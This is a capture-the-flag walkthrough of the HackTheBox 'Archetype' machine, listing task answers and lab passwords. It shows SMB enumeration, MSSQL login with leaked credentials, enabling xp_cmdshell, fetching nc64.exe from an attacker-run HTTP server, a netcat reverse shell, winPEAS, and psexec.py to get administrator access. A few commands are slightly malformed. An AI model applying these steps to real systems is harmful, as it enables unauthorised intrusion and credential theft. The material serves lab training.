<h1>Archetype</h1>

<h2>CONNECT</h2>
Connect to Starting Point VPN before starting the machine<br>
Using <code>openvpn</code> to operate the file of <code>download vpn</code> in kali.

<h2>TASK</h2>

<h3>TASK 1</h3>
Q：Which TCP port is hosting a database server?<br>
A：<code>1433</code><br><br>
<img src="https://i.imgur.com/yv7T521.png" alt="nmap" width="60%">

<h3>TASK 2</h3>
Q：What is the name of the non-Administrative share available over SMB?<br>
A：<code>backups</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/smbclient.png" alt="smbclients" width="60%">


<h3>TASK 3</h3>
Q：What is the password identified in the file on the SMB share?<br>
A：<code>M3g4c0rp123</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/password.png" alt="password" width="60%">

<h3>TASK 4</h3>
Q：What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?<br>
A：<code>mssqlclient.py</code><br>
FYI：<a href="https://www.secureauth.com/labs/open-source-tools/impacket/">Secure Auth</a>

<h3>TASK 5</h3>
Q：What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?<br>
A：<code>xp_cmdshell</code><br>
FYI：<a href="1433 - Pentesting MSSQL - Microsoft SQL Server">1433 - Microsoft SQL Server</a><br>
FYI：<a href="https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">MSSQL Injection Cheat Sheet</a><br>

<h3>TASK 6</h3>
Q：What script can be used in order to search possible paths to escalate privileges on Windows hosts?<br>
A：<code>WinPEAS</code><br>
FYI：<a href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md">Windows Privilege Escalation Awesome Script (.exe)</a>

<h3>TASK 7</h3>
Q：What file contains the administrator's password?<br>
A：<code>ConsoleHost_history.txt</code><br>

<h2>SUBMIT FLAG</h2>
See two important ports are 445 port and 1433 port.<br>
<img src="https://i.imgur.com/yv7T521.png" alt="nmap" width="60%">
Using smbclient to browse shared folders.<br>
<b>cmd</b>：<code>smbclient -L &lt;target_ip&gt;</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/smbclient.png" alt="smbclient" width="60%">

There are many similarities with ftp commands in smbclient, such as: cd, ls, get, put...<br>
You can also use <code>help</code> to view commands.<br><br>
Once in the backups folder, use <code>ls</code> to view the current directory.<br>
Using <code>get</code> command to download the <code>prod.dtsConfig</code>.<br>
<b>cmd</b>：<code>smbclient -N //&lt;target_ip&gt;/backups</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/smbclient3.png" alt="smbclient3" width="60%">

<code>cat</code> the data in <code>prod.dtsConfig</code>, it can be found that the password of the user sql_svc is <code>M3g4c0rp123</code>, and the host is <code>ARCHETYPE</code>.<br>
The information provided in prog.dtsConfig allows us to connect and successfully authenticate into the <code>MSSQL server</code>.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/password.png" alt="password" width="60%">

There are many python scripts in <a href="https://github.com/fortra/impacket">Impacket</a> for us to use, and what will be used here is <a href="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/mssqlclient.py"> mssqlclient.py</a>.
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/mssqlclient.png" alt="mssqlclient" width="60%">

<b>cmd</b>：<code>python3 mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@&lt;target_ip&gt; -windows-auth</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/MSSQLauth.png" alt="MSSQLauth" width="60%"><br>
After entering SQL, enter <code>help</code> to see which tools or functions are currently available.<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLhelp.png" alt="SQLhelp" width="60%"><br>
Confirm current identity (1=True).<br>
<b>cmd</b>：<code>SELECT is_srvrolemember('sysadmin');</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLrole.png" alt="SQLrole" width="60%"><br>
If no settings have been configured, the result of the command is as shown in the pic below.<br>
<b>cmd</b>：<code>EXEC xp_cmdshell 'net user';</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/netuser.png" alt="netuser" width="60%">

Indeed is not activated.<br>
For this reason we will need to proceed with the activation of <code>xp_cmdshell</code> as
follows:<br>
<pre class="text">
EXEC sp_configure 'show advanced options', 1;   #Open advanced settings, 1=True
RECONFIGURE;    #Reconfigure so that the settings just now have been confirmed
sp_configure;   #Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;   #Open xp_cmdshell, 1=True
RECONFIGURE;
</pre>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLconfigure.png" alt="SQLconfigure" width="60%">

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLcondigure2.png" alt="SQLcondigure2" width="60%"><br>

Now we are able to execute system commands:<br>
<b>cmd</b>：<code>xp_cmdshell "whoami"</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/SQLwhoami.png" alt="SQLwhoami" width="60%"><br>
Now, we will attempt to get a stable reverse shell.<br><br>
We will upload the <code>nc64.exe</code> binary to the target machine and execute an interactive cmd.exe process on our listening port.<br>
You can download the binary from <a href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------">here</a>.<br>
<b>cmd</b>：<code>nc -lvnp 443</code><br>
<b>cmd</b>：<code>python3 -m http.server 80</code><br>

As a user archetype/sql_svc , we don't have enough privileges to upload files in a system directory and
only user Administrator can perform actions with higher privileges.<br>
We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.<br><br>
After a quick enumeration we found that Downloads is working perfectly for us to place our binary.<br>
In order to do that, we are going to use the wget tool within PowerShell:<br>
<b>cmd</b>：<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;target_ip&gt;/nc64.exe -outfile nc64.exe"</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/httpserver.png" alt="httpserver" width="60%">

<b>cmd</b>：<code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe &lt;target_ip&gt;</code><br>
Finally looking back at our netcat listener we can confirm our reverse shell and our foothold to the system:<br>

<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/nc.png" alt="nc" width="60%">
You can find the user.txt in user's Desktop！<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/userflag.png" alt="userflag" width="40%">

<h2>Privilege Escalation</h2>
It is possible to download winpeas from <a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS/winPEASexe">here</a>.<br>
We will transfer it to our target system by using once more the Python HTTP server:<br>
<b>cmd</b>：<code>python3 -m http.server 80</code><br><br>

On the target machine, we will execute the <code>wget</code> command in order to download the program from our
system.<br>
The file will be downloaded in the directory from which the wget command was run.<br>
We will use powershell for all our commands:<br>
<b>cmd</b>：<code>powershell</code><br>
<b>cmd</b>：<code>wget http://&lt;local_ip&gt;/winPEASx64.exe -outfile winPEASx64.exe</code><br><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/powershell.png" alt="powershell" width="60%"><br>
We successfully downloaded the binary. To execute it, we will do the following:<br>
<b>cmd</b>：<code>PS C:\Users\sql_svc\Downloads> .\winPEASx64.exe</code><br><br>
We can navigate to the folder where the PowerShell history is stored:<br>
<b>cmd</b>：<code>type ConsoleHost_history.txt</code><br>
We got in cleartext the password for the Administrator user which is <code>MEGACORP_4dm1n!!</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/adminpasswd.png" alt="adminpasswd" width="60%">

We can now use the tool <code>psexec.py</code> again from the Impacket suite to get a shell as the <code>administrator</code>:<br>
<b>cmd</b>：<code>python3 psexec.py administrator@&lt;target_ip&gt;</code><br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/psexec.py.png" alt="psexec" width="50%"><br>
You can find the root.txt on the Desktop of the Administrator user！<br>
<img src="https://github.com/laiyutong/HackTheBox/blob/main/Starting%20Point/TIER%202/Archetype/Archrtype/adminflag.png" alt="adminflag" width="60%">
